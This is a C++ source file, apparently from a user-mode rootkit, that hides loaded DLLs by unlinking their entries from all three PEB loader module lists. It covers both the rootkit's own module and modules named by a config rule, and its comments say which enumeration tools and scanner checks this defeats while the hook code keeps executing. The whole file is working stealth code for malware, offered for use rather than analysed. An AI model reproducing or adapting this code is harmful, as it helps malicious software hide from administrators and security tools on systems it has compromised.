/*
 * selfhide.cpp - Loader-level (PEB) module hiding.
 *
 * Unlinks LDR_DATA_TABLE_ENTRY records from the three loader module
 * lists so that:
 *
 *   - EnumProcessModules / Module32First / "Get-Process | fl Modules"
 *     no longer report the DLL, and
 *   - the module name cannot be found through the loader list by a tool
 *     that only trusts PEB->Ldr (the memory stays mapped and the code
 *     keeps executing).
 *
 * Three lists are maintained by the loader and must be kept consistent:
 *
 *   InLoadOrderModuleList          (entry offset 0x00)
 *   InMemoryOrderModuleList        (entry offset 0x10)
 *   InInitializationOrderModuleList(entry offset 0x20)
 *
 * All three hold the same LIST_ENTRY nodes inside the same entry, so an
 * unlink has to be applied to each one; leaving a node in a second list
 * is a visible inconsistency that scanners check for.
 *
 * Only the loader lists are touched. NtQueryVirtualMemory /
 * NtQueryInformationProcess(ProcessMappedView) still see the mapping, so
 * this is specifically anti-enumeration, not anti-detection: it defeats
 * the overwhelmingly common tooling path and nothing else.
 */
#include "rkhooks.h"
#include "api.h"
#include "../common/rknt.h"
#include "../common/config.h"

#include <stddef.h>
#include <string.h>

/* ================================================================== */
/* Private loader structures                                           */
/* ================================================================== */

/*
 * Declared locally (rather than taken from winternl.h) because the
 * public PEB_LDR_DATA/LDR_DATA_TABLE_ENTRY shapes differ between the
 * SDK and the mingw-w64 headers, and the layout below is the one that
 * actually exists in memory on x64.
 */
typedef struct _RK_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} RK_LDR_ENTRY;

typedef struct _RK_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} RK_LDR_DATA;

/* PEB prefix up to Ldr (x64): +0x18. */
typedef struct _RK_PEB_LITE {
    BYTE  Reserved1[2];
    BYTE  BeingDebugged;
    BYTE  Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
} RK_PEB_LITE;

static RK_LDR_DATA *rk_get_ldr(void)
{
    RK_PEB_LITE *peb;

    peb = (RK_PEB_LITE *)(void *)NtCurrentTeb()->ProcessEnvironmentBlock;
    if (!peb || !peb->Ldr)
        return NULL;
    if (((RK_LDR_DATA *)peb->Ldr)->Length == 0)
        return NULL;
    return (RK_LDR_DATA *)peb->Ldr;
}

/* ================================================================== */
/* List surgery                                                        */
/* ================================================================== */

/*
 * Unlink a node and poison the pointers. Clearing Flink/Blink makes a
 * second pass over the same entry a no-op instead of corrupting the
 * list, which matters because rk_hide_peb_self() and the config watcher
 * can both run.
 */
static void rk_unlink_node(LIST_ENTRY *node)
{
    LIST_ENTRY *f = node->Flink;
    LIST_ENTRY *b = node->Blink;

    if (!f || !b || f == node || b == node)
        return;

    b->Flink = f;
    f->Blink = b;
    node->Flink = NULL;
    node->Blink = NULL;
}

static int rk_entry_linked(const RK_LDR_ENTRY *e)
{
    return e->InLoadOrderLinks.Flink != NULL;
}

static void rk_unlink_entry(RK_LDR_ENTRY *e)
{
    /* Initialization-order links are not populated for every module and
     * some loaders keep them detached; unlink each valid pair. */
    if (e->InLoadOrderLinks.Flink && e->InLoadOrderLinks.Blink)
        rk_unlink_node(&e->InLoadOrderLinks);
    if (e->InMemoryOrderLinks.Flink && e->InMemoryOrderLinks.Blink)
        rk_unlink_node(&e->InMemoryOrderLinks);
    if (e->InInitializationOrderLinks.Flink &&
        e->InInitializationOrderLinks.Blink)
        rk_unlink_node(&e->InInitializationOrderLinks);
}

/* Copy a UNICODE_STRING into a bounded NUL-terminated buffer. */
static void rk_copy_ustr(wchar_t *dst, size_t dst_cch,
                         const UNICODE_STRING *us)
{
    size_t n;

    if (!us || !us->Buffer || !us->Length)
    {
        if (dst_cch)
            dst[0] = 0;
        return;
    }

    n = (size_t)us->Length / sizeof(WCHAR);
    if (n >= dst_cch)
        n = dst_cch - 1;
    memcpy(dst, us->Buffer, n * sizeof(WCHAR));
    dst[n] = 0;
}

/* ================================================================== */
/* Public entry points                                                 */
/* ================================================================== */

/*
 * Unlink every module whose base, base name or full path matches a
 * [HideModule] rule. Returns the number of entries removed.
 */
extern "C" int rk_hide_peb_modules(void)
{
    RK_LDR_DATA *ldr = rk_get_ldr();
    LIST_ENTRY  *head, *cur;
    rk_config    cfg;
    int          removed = 0;

    if (!ldr)
        return 0;

    rk_config_snapshot(&cfg);
    if (!cfg.module_count)
        return 0;

    head = &ldr->InLoadOrderModuleList;
    cur  = head->Flink;

    while (cur && cur != head)
    {
        RK_LDR_ENTRY *e    = (RK_LDR_ENTRY *)(void *)cur;
        LIST_ENTRY   *next = cur->Flink;
        wchar_t       base[RK_MAX_NAME];
        wchar_t       full[RK_MAX_NAME * 2];
        int           i, hit = 0;

        /* Only ever follow entries that are still linked. */
        if (!rk_entry_linked(e))
            break;

        rk_copy_ustr(base, RK_MAX_NAME, &e->BaseDllName);
        rk_copy_ustr(full, RK_MAX_NAME * 2, &e->FullDllName);

        for (i = 0; i < cfg.module_count && !hit; ++i)
        {
            wchar_t *pat = cfg.modules[i];
            if (!pat[0])
                continue;
            if (base[0] && rk_wcsw(pat, base))
                hit = 1;
            else if (full[0] && rk_wcsw(pat, full))
                hit = 1;
        }

        if (hit)
        {
            rk_unlink_entry(e);
            ++removed;
        }

        cur = next;
    }

    return removed;
}

/*
 * Unlink this DLL from the loader lists. The base address is resolved
 * from a function inside the module itself rather than from the HINSTANCE
 * passed to DllMain, because DllMain is not reachable from every caller
 * (the config watcher can ask for this too) and the address is what we
 * match on anyway.
 */
extern "C" void rk_hide_peb_self(void)
{
    RK_LDR_DATA *ldr = rk_get_ldr();
    LIST_ENTRY  *head, *cur;
    HMODULE      self = NULL;
    int          found = 0;

    if (!ldr)
        return;

    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCSTR)(const void *)&rk_hide_peb_self, &self) ||
        !self)
        return;

    head = &ldr->InLoadOrderModuleList;
    cur  = head->Flink;

    while (cur && cur != head)
    {
        RK_LDR_ENTRY *e    = (RK_LDR_ENTRY *)(void *)cur;
        LIST_ENTRY   *next = cur->Flink;

        if (!rk_entry_linked(e))
            break;

        if (e->DllBase == (PVOID)self)
        {
            rk_unlink_entry(e);
            found = 1;
            break;
        }

        cur = next;
    }

    /*
     * Deliberately not freeing anything: the module stays mapped so its
     * hook bodies keep running. GetModuleHandle/GetProcAddress on our own
     * name will now fail inside this process, which is the cost of the
     * technique.
     */
    (void)found;
}
